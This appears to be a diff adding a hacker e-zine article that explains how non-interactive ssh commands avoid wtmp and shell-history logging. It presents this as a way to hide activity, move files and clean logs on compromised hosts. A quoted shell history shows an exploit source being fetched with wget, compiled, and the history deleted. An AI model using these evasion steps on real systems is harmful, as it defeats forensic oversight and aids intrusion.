@@ -1,0 +1,333 @@
+<html><head><title>EOF ISSUE #0x01</title>
+<style fprolloverstyle>A:hover {color: #D1F2C4; text-decoration: none}</style></head>
+<body text="#E0E0E0" bgcolor="#131313" link="#BFBFBF" vlink="#BFBFBF" alink="#BFBFBF" style="font-size: 10pt">
+
+<pre><hr>|| Author: Rembrandt/Helith || <a style="text-decoration: none" href="../mainmenu/articles.htm"><span style="text-decoration: none">Back to articles</span></a> ||<hr></pre>
+<pre>
+            _   _ _____ _     ___ _____ _   _
+           / / / / ____/ /   /  _/_  __/ / / /
+          / /_/ / __/ / /    / /  / / / /_/ /
+         / __  / /___/ /____/ /  / / / __  /
+        /_/ /_/_____/_____/___/ /_/ /_/ /_/ 
+
+
+BASHing OpenSSH and for Fun and Profit
+======================================
+
+Table of Content
+----------------
+
+Author: Rembrandt
+Status: Beta-3
+
+0.  Intro
+1.  Explanation of the Idea
+1.1 What goes wrong?
+2.  Simple Practical POCs
+2.1 Getting Data
+2.2 Writing Data
+3.  Further Ideas
+4.  Executing more commands
+
+0. Intro
+----------------------------
+Hello everybody,
+
+This time I`m writing about some stuff I've noticed during using OpenSSH.
+I`m sure other people did notice it too and propably even earlier but as
+far as I do know nobody wrote about it and I didn`t do it either
+for some years now.
+Well it isn`t something special nor any l33t-exploit but it`s still useable
+to cover your tracks.
+Because people often asked me to write something (and even publish something)
+I decided to write about the OpenSSH-related stuff I did notice.
+
+1. Explanation of the Idea
+--------------------------
+OpenSSH allows, to be kind of scriptable, to run one command
+wich gets executed immediatly after your username and password/ssh-key was
+verified. The sshd does not log anything into wtmp if you do use ssh like I`ll
+explain below. So logcleaning becomes a lot faster if the responseable
+Administrator does ever notices the missmatches in the different logfiles.
+
+You may think you won't get logged anywhere and that's also correct 
+except for these logfiles:
+ - /var/log/secure  - if you used su/sudo 
+ - /var/log/authlog - if your password or the key was accapted
+
+It should be OS independent but I do list the tested OpenSSH versions/OSs too.
+
+Tested:
+OpenSSH 4.4	(OpenBSD i386/amd64)
+OpenSSH 4.3     (OpenBSD i386/amd64)
+OpenSSH_3.8.1p1 (Debian-8.sarge.4 i386)
+
+I did not have any host running with a commercial SSH-Version or a version from
+another vendor then OpenSSH.
+
+The whole idea is simple. Execute a command immediatly and analyse the output.
+Because you don`t log in directly and don`t get a tty assigned.
+This helps you to get not logged into too many logfiles
+(exceptions are listed above) and also programs like ttyrec or termcap won't
+log anything because you do never get a tty assigned.
+Please do keep in mind that tools like netstat will show the connection
+if it`s still present if netstat was executed.
+
+Basic command:
+ssh HOST COMMAND
+
+A simple Example with anonymized hosts:
+********************************************************************************
+godfather $ ssh wizzard last
+root      ttyp0    cpt.hook.darpa.net       Mon Apr 17 02:27   still logged in
+cyneox    ttyp0    somewhere.un.int         Sun Apr 16 18:37 - 19:10  (00:33)
+cyneox    ttyp5    somewhere.un.int         Sun Apr 16 14:49 - 14:50  (00:00)
+cyneox    ttyp0    somewhere.un.int         Sun Apr 16 13:58 - 15:02  (01:04)
+cyneox    ttyp5    somewhere.un.int         Sat Apr 15 10:20 - 10:25  (00:05)
+cyneox    ttyp0    somewhere.un.int         Sat Apr 15 10:03 - 10:25  (00:21)
+********************************************************************************
+
+As you can see ssh did the following:
+
+1. ssh connected to wizzard
+2. Account verification
+3. Executing the Command
+4. Display the output of the command on your localhost
+5. You may have noticed that I was not listed in the output
+
+Information: I use Public-Key-Auth so I wasn`t asked for a password.
+	     Otherwise you`ve to type your password.
+	     I`m not in the output of the last command because
+             I had no tty assigned and I`m also not logged into the wtmp
+             either because of this.
+
+Another example with sudo:
+********************************************************************************
+godfather $ ssh wizzard sudo tail -1 /var/log/authlog
+Password:**********
+
+Apr 17 04:38:57 wizzard sshd[29192]: Accepted publickey for rembrandt from
+xx.xx.xx.xx port 38149 ssh2
+********************************************************************************
+
+What happened here?
+
+1. ssh connected
+2. Account verification
+3. Executing the Command: sudo
+4. Requesting local Password for sudo
+   Because this is already kind of scripted it wont get hidden if you enter it.
+   So it is readable for everybody who has an eye on your monitor.
+5. Executing the Command: tail + parameters
+6. Display the output on your localhost
+7. Close the connection to your Computer
+
+INFO: If you use sudo and/or su you get logged at /var/log/secure.
+      If sudo was configured with timestamps sudo will act like you was logged
+      in and it will remember your password for a short time (depends on the
+      configuration) and you don`t need to retype it.
+      This is useable if you got a user wich is allowed to use sudo and wanna
+      execute some commands in a row. You could simply write a Shell-Script.
+
+Proof:
+********************************************************************************
+godfather $ ssh wizzard sudo tail -1 /var/log/secure
+Apr 17 04:42:45 wizzard sudo: rembrandt : TTY=unknown ; PWD=/home/rembrandt ;
+USER=root ; COMMAND=/usr/bin/tail -1 /var/log/secure
+********************************************************************************
+
+As you can see our actions where logged in /var/log/secure.
+And as mentioned before we are also logged in /var/log/authlog.
+
+Another example to show that we don`t alter the .bash_history:
+********************************************************************************
+godfather $ ssh linux.host.int head .bash_history
+Password:
+wget http://digital.net/~gandalf/NewDawn3.c
+gcc NewDawn3.c
+rm NewDawn3.c
+ls
+rm -f .bash_history
+ls
+godfather $ ssh linux.host.int w
+Password:
+ 02:34:55 up 81 days,  2:03,  0 users,  load average: 0.00, 0.02, 0.00
+USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
+godfather $ ssh linux.host.int head .bash_history
+Password:
+wget http://digital.net/~gandalf/NewDawn3.c
+gcc NewDawn3.c
+rm NewDawn3.c
+ls
+rm -f .bash_history
+ls
+godfather $
+********************************************************************************
+
+Information: I don`t use SSH-Key-Auth so ssh askes me for my password.
+	     The SSH Password gets encrypted.
+	     But remember: The sudo-Password will be written to the screen!
+
+
+1.1 What goes wrong?
+--------------------
+
+The short answer has to be: Nothing
+Everything works like it should.
+
+But the long answer should be:
+ssh was designed to run one command immediatly without writing Logs nor 
+touching any Logfile except of /var/log/authlog and /var/log/secure
+if you use su or sudo.
+You could run a script wich runs the same Command on e.g. 30 Servers (f.e. with
+Puplic-Key-Auth) and also saves the output (more later) to provide statistics.
+We simply abuse this functionality in a way it wasn't concepted for.
+So in case a administrator won't check all Logfiles by hand the responsable
+Administrator should not notice the missmatches between /var/log/authlog and 
+the wtmp or termcap-logfile.
+
+
+2.  Simple Practical PoCs
+-------------------------
+
+The most simple PoC was provided above.
+Running ssh this way allows you to use all advantages of your shell. You could
+also dump the output to a file using the &gt; command or do anything you can 
+imagine.
+
+A simple Proof of Concept with a command used above:
+********************************************************************************
+godfather $ ssh wizzard last | head -2 &gt; /tmp/testfoo
+godfather $ cat /tmp/testfoo
+root      ttyp0    somewhere.theocean.net Mon Apr 17 04:36   still logged in
+root      ttyp0    somewhere.theocean.net Mon Apr 17 02:27 - 04:36  (02:09)
+********************************************************************************
+
+This shows how easy datamanipulating became!
+It also points out that even arguments are no problem.
+
+2.1 Getting Data
+----------------
+You noticed already that we can get ascii-Data like the Output of the lastlog
+using last. But we won't give up and will get RAW (binary) data.
+
+2.1 A Simple Practical PoC
+--------------------------
+********************************************************************************
+godfather $ ssh wizzard cat /bin/ls &gt; /tmp/datafoo
+godfather $ file /tmp/datafoo
+/tmp/datafoo: ELF 32-bit LSB executable, Intel 80386, version 1, for OpenBSD,
+statically linked, stripped
+********************************************************************************
+
+********************************************************************************
+godfather $ uname -a
+OpenBSD godfather.helith.org 3.9 GENERIC.MP#0 amd64
+godfather  $ scp ls root@kerberos:/tmp
+godfather $ ssh root@kerberos
+kerberos $ uname -a
+OpenBSD kerberos.helith.org 3.8 GENERIC#286 i386
+kerberos $ cd /tmp &amp;&amp; ./ls -la scp 
+-rwxr-xr-x   1 root  wheel  170592 Apr 17 05:08 ls
+********************************************************************************
+
+As you can see we`re perfectly able to get Binary-Files which also do work and
+don&acute;t get corrupted via SSH and without using scp nor sftp which could get
+logged or is maybe even prohebit by the amdin too.
+I choosed a binary except of a binary logfile because I wanted to show you that
+these files are 100% valid and working.
+
+
+2.2 Writing Data
+----------------
+Writing data is, thanks to the pipes, as easy as getting data.
+
+Why don`t we use scp or sftp?
+sftp could get logged in another Logfile and scp could be removed by a paranoid
+Administrator. So with these methods we could use one hacked Box to jump to
+another and we could even do filetransfers or modify logfiles &quot;offline&quot;.
+
+Basic command for file upload:
+cat file | ssh host 'cat &gt; file'
+
+Example:
+********************************************************************************
+godfather $ cat rose.c | ssh root@kerberos 'cat &gt; /tmp/r.c'
+godfather $ ssh root@kerberos ls /tmp
+.ICE-unix
+.X11-unix
+r.c
+godfather $
+********************************************************************************
+
+So that`s the theory and practice behind the file-upload.
+
+
+3.  Further Ideas
+-----------------
+
+With this technic you can download and upload files and won't get noticed by
+some important system-Logfiles! If you don&acute;t use su or sudo you&acute;re
+completly hidden!
+Ok.. except the authlog. ;-)
+
+This allows you to write REMOTE-Logcleaners wich clean Logfiles or manipulate
+data on remote-hosts without the need to store your utilities there.
+This makes Forensic nearly impossible because except of a copy of the modified
+(in our case) Logfile you do not store anything temporary at the remote Host.
+So the forensic will simply become useless and wont tell WhiteHats what Scripts
+or Applications you used.
+
+Further IDEAS: 
+
+You enter your commands into a file and thus file gets parsed by a Script.
+The Parser parses them and runs as many as possible at once and
+pipes the output to a file.
+This would reduce the ammount of notifications in the authlog
+and it would speed up some stuff too.
+
+Another neat Idea wich should get investigated is the fact that you
+can run an SSH. It`s like executing any other command.
+I found, for now, 2 Problems:
+
+1. The host must be known in the known_hosts
+ - I mean the file at the Box you want to use as Proxy
+2. The 2nd SSH can`t ask you for a password.
+ - Should be no problem with a SSH-Key
+
+Example:
+********************************************************************************
+godfather $ ssh linux.host.int ssh another.box.int
+Pseudo-terminal will not be allocated because stdin is not a terminal.
+Permission denied, please try again.
+Permission denied, please try again.
+Permission denied (publickey,password,keyboard-interactive).
+********************************************************************************
+
+The Password must be provided by th Shell if that`s possible.
+Perl provides something to do this or you simply use Key-Auth.
+In my oppinion this should be investigated by you if you`re interested. ;-]
+
+$ ssh linux.host.int 'ssh another.box.int' should fix the Problem. Or you put it
+directly into some authorized_key wrapper.
+Well just use ssh-agents for this.
+
+This would allow you to use a Server as Proxy to get informations from
+another (3rd) Box. If you maybe even control the &quot;Proxy&quot; you could even
+remove yourself from the authlog and so it becomes completly stealthly.
+
+Another very usefull fact is that you can run Portscans (and also other stuff).
+
+You may think that logging in directly to the &quot;Proxy&quot; would be the better idea.
+That`s not quiet true because your connection gets displayed in the Outputs
+of w, who, users and other tools. So if you won't spend too much attention
+(placing backdoors) to your
+Proxy using SSH as descriped above will solve many things or makes them easier.
+But you still have to live with the fact that you get at least logged into
+one Logfile. But most admins don`t investigate authlog if other Logfiles won't
+show something interesting and if so they`re
+parsing the Logfile for non valid logins to stop ssh-brute-forcing.
+
+And if you`re realy &quot;paranoid&quot; you`ll use ssh tunneled via tor anyway.
+Don`t you?
+</pre></body></html>
